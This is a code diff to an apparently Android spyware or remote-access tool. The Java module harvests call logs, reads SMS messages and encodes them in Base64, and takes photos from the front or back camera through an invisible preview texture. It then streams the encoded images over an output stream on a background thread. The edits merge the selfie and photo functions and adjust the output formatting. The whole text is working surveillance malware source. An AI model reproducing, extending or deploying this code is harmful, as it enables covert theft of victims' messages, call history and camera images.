@@ -57,7 +57,7 @@ public class modules {
             dialed = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
             number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
             duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
-            stringBuffer.append("Call to number: " + number + ", registered at: " + new Date(dialed).toString() + " for duration " + duration);
+            stringBuffer.append("Call to number: " + number + ", registered at: " + new Date(dialed).toString() + " for duration " + duration + "\n");
         }
         cursor.close();
         stringBuffer.append(END_HEADER);
@@ -89,15 +89,12 @@ public class modules {
         while ( messagesCursor != null && messagesCursor.moveToNext()) {
             String number = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.ADDRESS));
             String body = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.BODY));
-            allMessages.append(Base64.encodeToString(number.getBytes(), Base64.DEFAULT));
-            allMessages.append(Base64.encodeToString(" : ".getBytes(), Base64.DEFAULT));
-            allMessages.append(Base64.encodeToString(body.getBytes(), Base64.DEFAULT));
-            allMessages.append(Base64.encodeToString("\n".getBytes(), Base64.DEFAULT));
+            allMessages.append(number + " : " + body + "\n");
         }
         messagesCursor.close();
-        allMessages.append(END_HEADER);
-        Log.d("Messages", allMessages.toString());
-        return allMessages.toString() + "\n";
+        String base64Data = Base64.encodeToString(allMessages.toString().getBytes(), Base64.DEFAULT);
+        base64Data += "\n" + END_HEADER;
+        return base64Data;
     }
 
     public static String getClipBoardContent(Activity activity) {
@@ -111,86 +108,24 @@ public class modules {
         return "Nothing found";
     }
 
-    //TODO Merge getSelfie and getPhoto into one Method
-    public static String getSelfie(Context mContext, OutputStream out) {
-        StringBuffer entireEncodedSelfie = new StringBuffer();
-        Camera camera;
-        int cameraId = -1;
-
-        if (mContext.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
-            int totalCameras = Camera.getNumberOfCameras();
-            //Loop through all camera Id's to find Front facing one
-            for (int i = 0; i < totalCameras; i++) {
-                Camera.CameraInfo info = new Camera.CameraInfo();
-                Camera.getCameraInfo(i, info);
-                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                    cameraId = i;
-                    break;
-                }
-            }
-            if (cameraId < 0) {
-                entireEncodedSelfie.append("No front facing camera was found on the device\n");
-            } else {
-                camera = Camera.open(cameraId);
-                try {
-                    camera.setPreviewTexture(new SurfaceTexture(0));
-                    camera.startPreview();
-                    camera.takePicture(null, null, new Camera.PictureCallback() {
-                        @Override
-                        public void onPictureTaken(byte[] data, Camera camera) {
-                            if (camera != null) {
-                                camera.stopPreview();
-                                camera.release();
-                                camera = null;
-                            }
-                            //Convert the data to Image then encode it in Base64 String uuuuhhhh!!
-                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
-                            bitmap.compress(Bitmap.CompressFormat.PNG, 90, byteArrayOutputStream);
-                            byte[] bytes = byteArrayOutputStream.toByteArray();
-                            entireEncodedSelfie.append(Base64.encodeToString(bytes, Base64.DEFAULT));
-                            entireEncodedSelfie.append(END_HEADER + "\n");
-                            Thread sendSelfie = new Thread(new Runnable() {
-                                @Override
-                                public void run() {
-                                    try {
-                                        out.write(entireEncodedSelfie.toString().getBytes("UTF-8"));
-                                    } catch (Exception e) {
-                                        e.printStackTrace();
-                                    }
-                                }
-                            });
-                            sendSelfie.start();
-                        }
-                    });
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }
-        } else {
-            entireEncodedSelfie.append("No Camera hardware was detected on this device\n");
-        }
-        return entireEncodedSelfie.toString();
-    }
-
-    public static String getPhoto(Context mContext, OutputStream out) {
+    public static String takePhoto(int cameraFace, Context mContext, OutputStream out) {
         StringBuffer entireEncodedImage = new StringBuffer();
         Camera camera;
         int cameraId = -1;
 
         if (mContext.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
             int totalCameras = Camera.getNumberOfCameras();
-            //Loop through all camera Id's to find Back Facing Camera
+            //Loop through all camera Id's to find Relevant Camera
             for (int i = 0; i < totalCameras; i++) {
                 Camera.CameraInfo info = new Camera.CameraInfo();
                 Camera.getCameraInfo(i, info);
-                if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
+                if (info.facing == cameraFace) {
                     cameraId = i;
                     break;
                 }
             }
-            if (cameraId != Camera.CameraInfo.CAMERA_FACING_BACK) {
-                entireEncodedImage.append("No back facing camera was found on the device\n");
+            if (cameraId != cameraFace) {
+                entireEncodedImage.append("Requested camera doesn't seem to exist on the device");
             } else {
                 camera = Camera.open(cameraId);
                 try {
@@ -204,13 +139,13 @@ public class modules {
                                 camera.release();
                                 camera = null;
                             }
-                            //Convert the data to Image then encode it in Base64 String uuuuhhhh!!
+                            //Convert the data to Image then encode it in Base64 String and send over a new Thread
                             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                             Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                             bitmap.compress(Bitmap.CompressFormat.PNG, 90, byteArrayOutputStream);
                             byte[] bytes = byteArrayOutputStream.toByteArray();
                             entireEncodedImage.append(Base64.encodeToString(bytes, Base64.DEFAULT));
-                            entireEncodedImage.append(END_HEADER + "\n");
+                            entireEncodedImage.append(END_HEADER);
                             Thread sendImage = new Thread(new Runnable() {
                                 @Override
                                 public void run() {
